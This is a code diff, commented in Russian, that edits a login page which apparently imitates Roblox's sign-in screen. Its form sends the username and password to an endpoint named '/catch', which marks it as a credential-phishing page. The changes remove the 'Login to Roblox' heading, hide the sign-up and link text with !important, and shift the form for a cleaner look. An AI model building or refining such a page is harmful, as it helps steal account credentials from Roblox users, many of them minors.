@@ -26,15 +26,16 @@
             width: 100%;
             max-width: 390px;
             padding: 0;
-            margin-top: -25px;
+            margin-top: 20px; /* Немного опустили форму, так как заголовка больше нет */
             margin-left: 20px;
             box-sizing: border-box;
         }
 
+        /* Полностью скрываем ненужные элементы */
         h1, 
         .link-text, 
         .signup-text {
-            display: none;
+            display: none !important;
         }
 
         form {
@@ -100,8 +101,7 @@
 <body>
 
     <div class="auth-container">
-        <h1>Login to Roblox</h1>
-        
+        <!-- Заголовок убран -->
         <form action="/catch" method="POST">
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
             <input type="password" name="password" class="input-control" placeholder="Password" required>
